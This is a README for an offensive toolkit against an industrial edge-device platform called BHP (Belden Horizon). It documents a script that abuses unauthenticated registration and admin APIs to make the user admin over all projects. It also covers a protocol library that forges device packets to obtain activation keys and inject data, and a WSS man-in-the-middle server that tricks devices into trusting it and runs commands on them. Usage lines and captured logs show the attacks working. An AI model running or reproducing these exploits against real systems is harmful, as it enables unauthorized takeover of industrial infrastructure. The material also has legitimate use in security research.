# Tools for BHP #

## self_register.py ##
Simple python script that can be used for registering yourself on BHP and makes yourself admin for all projects that exist.

It utilizes two Vulnerabilities:
- Selfregister service that can be called unauthenticated
- unauthenticated admin rest API


### Usage ###
```
python3 selfregister.py --mail gidiyig432@cexch.com --organisation Belden
```

## avro_implementation.py + avro_sender.py ##

A small library that tries to implement the Protocol that is used between a Edge device and SPOG / Horizon.

The following packet formats are implemented:
- ClientConnect
- SetActivationKey
- NotifyEvent

There are plenty more though like sending a command to be executed and so on.

### Usage ###

You can just call the avro_sender.py script which has some use cases implemented using the Library residing in avro_implementation.py

```
# python3 avro_sender.py wss://onprem.belden-horizon.io/device-gateway/manager --host 172.16.10.12 --mac 74:0B:B0:AE:DD:A5 p1 --count 1 --model "ELX3"
4861333562303137662d393730322d343361332d623365342d36316366663537646433373800022237343a30423a42303a41453a44443a413500000000023c636f6d2e6e69726d6174612e6176726f2e436c69656e74436f6e6e6563740298012237343a30423a42303a41453a44443a413502061873657269616c4e756d6265722237343a30423a42303a41453a44443a41350a6d6f64656c08454c583312777354696d656f757404333000
✅ Sent (AVROProtocol(
  UUID: Ha35b017f-9702-43a3-b3e4-61cff57dd378
  MAC Address: 74:0B:B0:AE:DD:A5
  Command: com.nirmata.avro.ClientConnect
)) 172 bytes
⬇️  Received binary: 120 bytes
HEX: 4836333336343834622d393436392d343561632d393532652d6330323738656661336632350000022237343a30423a42303a41453a44443a413502c0a90700000250636f6d2e70726f736f66742e6176726f2e53657441637469766174696f6e4b6579526571756573740218146355464154377977364100
Got back activation key: b'cUFAT7yw6A'
```

It includes a help of the implemented modes.

**p1**: Sends ClientConnect packets with incrementing MAC addresses. Might be helpful to iterate over certain values

**p2**: Send a NotifyEvent to SPOG. Can be used to inject data into SPOG

## wss_mitm.py ##
Script that relies on the avro_implementation library.
It performs server tasks and lets a user send custom commands to execute to a device, custom activation keys and so on.

It implements different "flows" that are supported by the device:
- activateonly --> Send an empty activation key to the device + ACTIVATION_STATE set to ACTIVATED to trick the device into trusting us
- activationkey --> Send a custom activation key to the device
- exec-cmd --> Send a ExecCommandRequest to the device
- customrequest --> Send a custom request to the device. Parameters are not yet supported. Use it for typical getters
- exportconfig --> Send a ExportConfigurationRequest to the device

Each flow has custom subparameters.
Exportconfig is technically a static implementation of customrequest with the parameter set to: --request 'com.prosoft.avro.ExportConfigurationRequest'

### Usage ###

```
python3 wss_mitm.py --host 192.168.20.201 --port 443 --certfile /root/scripts/https/server.crt --keyfile /root/scripts/https/server.key FLOW
```

A sample usage for issuing docker info on a device:
```
# python3 wss_mitm.py --host 192.168.20.201 --port 443 --certfile /root/scripts/https/server.crt --keyfile /root/scripts/https/server.key exec-cmd --cmd docker ps --once   
/root/pentesting_tools/bhnx/wss_mitm.py:11: DeprecationWarning: websockets.server.WebSocketServerProtocol is deprecated
  from websockets.server import WebSocketServerProtocol
2026-01-21 10:00:48,955 INFO Sender loop started.
2026-01-21 10:00:48,955 INFO server listening on 192.168.20.201:443
2026-01-21 10:00:48,955 INFO WSS MITM Server started on 192.168.20.201:443
2026-01-21 10:00:56,102 INFO connection open
2026-01-21 10:00:56,102 INFO Client connected: 192.168.20.18:56026
2026-01-21 10:00:56,104 INFO [activation] incoming ClientConnect
2026-01-21 10:00:56,104 INFO [activation] completed -> state=ACTIVATED
2026-01-21 10:00:56,104 INFO [activation] sending back activation key 
2026-01-21 10:00:56,104 INFO [flow:exec-cmd] Activated => starting flow
2026-01-21 10:01:01,105 INFO Queued outbound packet (106 bytes)
2026-01-21 10:01:01,105 INFO [flow:exec-cmd] sent: b'JHb450e9c8-3d8c-44f8-9790-a93c74d808b4\x00\x02"00:01:02:03:04:05\x00\x00\x00\x00\x028com.prosoft.avro.ExecCommand\x02\x18\x04\x0cdocker\x04ps\x00'
2026-01-21 10:01:01,105 INFO [flow:exec-cmd] sent once.
2026-01-21 10:01:01,105 INFO Sent queued packet (106 bytes)
Got a packet without a type b'Hd3a9ca87-208b-428a-8c25-13c2207fb2dd\x04\x02"a0:b0:86:ff:06:0d\x02"a0:b0:86:ff:06:0d\x00\x00\x00\x00\x00'
2026-01-21 10:01:01,167 INFO [handler] Got a packet of requested type com.prosoft.avro.ExecCommandResponse
2026-01-21 10:01:01,167 INFO    sequenceId: Hb450e9c8-3d8c-44f8-9790-a93c74d808b4
        sequenceState: COMPLETED_SUCCESS
        source: a0:b0:86:ff:06:0d
        destination: 00:01:02:03:04:05
        timeoutInMilli: None
        errorCode: None
        errorDescription: None
        type: com.prosoft.avro.ExecCommandResponse
        body:
                stdout: CONTAINER ID        IMAGE                                                        COMMAND                  CREATED             STATUS                 PORTS                                            NAMES
9651f4179ad7        bhni:1.4.06                                                  "/bin/sh -c '/opt/be…"   6 days ago          Up 2 hours (healthy)                                                    bhni
a17f177588db        hurlenko/filebrowser:v2.32.0                                 "/filebrowser --root…"   7 weeks ago         Up 2 hours             0.0.0.0:8989->8080/tcp, 0.0.0.0:8989->8080/udp   File_browser
06d86f4144fd        blizzard.gad.local:6000/amd64/bh-protocol-gateway:2025.8.0   "/cnb/process/web"       8 weeks ago         Up 2 hours                                                              bhno_pgw

                stderr: 

``'
